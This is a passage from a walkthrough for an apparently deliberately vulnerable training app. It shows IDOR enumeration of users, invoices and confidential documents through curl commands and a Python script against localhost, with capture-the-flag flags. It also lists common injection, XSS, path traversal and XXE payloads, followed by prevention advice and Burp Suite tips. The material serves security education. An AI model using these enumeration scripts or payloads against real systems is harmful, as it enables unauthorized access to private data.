  curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=$id"
  echo "\n---"
done
```

**Explanation:** Predictable IDs make it trivial to enumerate all users in the system.

#### Step 4: Access Invoice Data
**Objective:** Access other users' financial documents

**Using curl:**
```bash
# Access your invoice
curl "http://localhost:5000/api/vuln/api-predictable-ids?invoiceId=5001"

# Access another user's invoice (IDOR)
curl "http://localhost:5000/api/vuln/api-predictable-ids?invoiceId=5002"
```

**Flag:** `FLAG{idor_invoice_access}`
**Exposed data:**
- Invoice amounts ($50,000 contract)
- Customer details
- Payment information
- Billing addresses

**Explanation:** Financial documents accessible by simply incrementing invoice IDs.

#### Step 5: Access Confidential Documents
**Objective:** Access highly restricted documents

**Using curl:**
```bash
# Public document
curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9001"

# Salary report (CONFIDENTIAL)
curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9002"

# Company financials
curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9003"

# API keys backup
curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9004"

# Database dump
curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9005"
```

**Flags:**
- Document 9002: `FLAG{idor_confidential_doc}` - Salary Report with executive compensation
- Document 9004: `FLAG{idor_master_flag}` - API Keys (AWS, Stripe)
- Document 9005: `FLAG{idor_database_dump}` - Customer Database (10M records)

**Explanation:** Most sensitive documents accessible without authorization!

### Automation Script
**Python script to enumerate all resources:**
```python
import requests

base_url = "http://localhost:5000/api/vuln/api-predictable-ids"

print("=== USER ENUMERATION ===")
for user_id in range(1001, 1011):
    response = requests.get(f"{base_url}?userId={user_id}")
    data = response.json()
    if data.get('success'):
        user = data.get('user', {})
        print(f"User {user_id}: {user.get('name')} - {user.get('email')}")

print("\n=== INVOICE ENUMERATION ===")
for invoice_id in range(5001, 5006):
    response = requests.get(f"{base_url}?invoiceId={invoice_id}")
    data = response.json()
    if data.get('success'):
        invoice = data.get('invoice', {})
        print(f"Invoice {invoice_id}: ${invoice.get('amount')} - {invoice.get('customerName')}")

print("\n=== DOCUMENT ENUMERATION ===")
for doc_id in range(9001, 9006):
    response = requests.get(f"{base_url}?docId={doc_id}")
    data = response.json()
    if data.get('success'):
        doc = data.get('document', {})
        print(f"Document {doc_id}: {doc.get('title')} - {doc.get('content')}")
        if 'flag' in doc:
            print(f"  🚩 FLAG: {doc['flag']}")
```

### Prevention Measures
1. **Use UUIDs** instead of sequential integers
2. **Implement authorization checks** - verify user owns the resource
3. **Use indirect references** - map user session to allowed resources
4. **Implement access control lists (ACLs)**
5. **Log and monitor access patterns** - detect enumeration attempts
6. **Rate limit API requests** - slow down automated scanning
7. **Use hash-based IDs** - `sha256(id + secret)` for public references

**Example secure implementation:**
```javascript
// BAD - Sequential ID
GET /api/invoices/5001

// GOOD - UUID
GET /api/invoices/f47ac10b-58cc-4372-a567-0e02b2c3d479

// BETTER - Hash-based reference with authorization check
GET /api/invoices/8f3d7e2a9b1c
// Server verifies: user owns this invoice before returning data
```

---

## General Testing Tips

### Tools You Can Use
1. **curl** - Command line HTTP client for testing
2. **Burp Suite** - Web application security testing platform
3. **OWASP ZAP** - Free security testing proxy
4. **sqlmap** - Automated SQL injection testing
5. **nmap** - Network scanning and service detection

### Common Payloads to Try
- Single quote (`'`) for SQL injection testing
- Script tags (`<script>alert(1)</script>`) for XSS testing
- Path traversal sequences (`../../../etc/passwd`) for file access
- Command separators (`;`, `&&`, `||`) for command injection
- XML entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) for XXE

### Burp Suite Configuration for Labs

**Initial Setup:**
1. Start Burp Suite (Community or Professional)
2. Configure browser proxy to 127.0.0.1:8080
3. Import Burp's CA certificate for HTTPS testing
4. Navigate to lab endpoints to begin testing

**Essential Burp Suite Tabs:**
- **Proxy** - Intercept and modify HTTP requests
- **Repeater** - Manual request testing and modification
- **Intruder** - Automated payload testing
- **Scanner** - Automated vulnerability detection (Pro only)
- **Decoder** - Encode/decode payloads
- **Comparer** - Compare responses for differences

**Recommended Extensions:**
- **JWT Editor** - JSON Web Token manipulation
- **Param Miner** - Hidden parameter discovery
- **Collaborator Everywhere** - Out-of-band testing
- **DOM Invader** - Advanced DOM XSS testing
- **Hackvertor** - Advanced encoding/evasion techniques

### Advanced Burp Suite Techniques

**Intruder Attack Types:**
1. **Sniper** - Single payload set, one position
2. **Battering Ram** - Single payload set, multiple positions
3. **Pitchfork** - Multiple payload sets, parallel iteration
4. **Cluster Bomb** - Multiple payload sets, all combinations

**Response Analysis:**
- Use "Grep" options to identify successful payloads
- Sort by response length, status code, or timing
- Use "Response" tab to examine HTML/JSON differences
- Configure "Redirections" handling for complex flows

**Payload Processing:**
- Use "Payload Processing" rules for encoding
- Add prefixes/suffixes for specific injection contexts
- Use "Macros" for session-dependent testing
- Configure "Resource Pool" for throttling

### Best Practices for Learning
1. Always test in controlled environments
2. Document your findings and successful payloads
3. Understand the underlying vulnerability before moving to exploitation
4. Practice responsible disclosure if testing real applications
5. Keep learning about new attack vectors and defense mechanisms

---

**Remember:** This walkthrough is for educational purposes only. Always ensure you have proper authorization before testing any application for security vulnerabilities.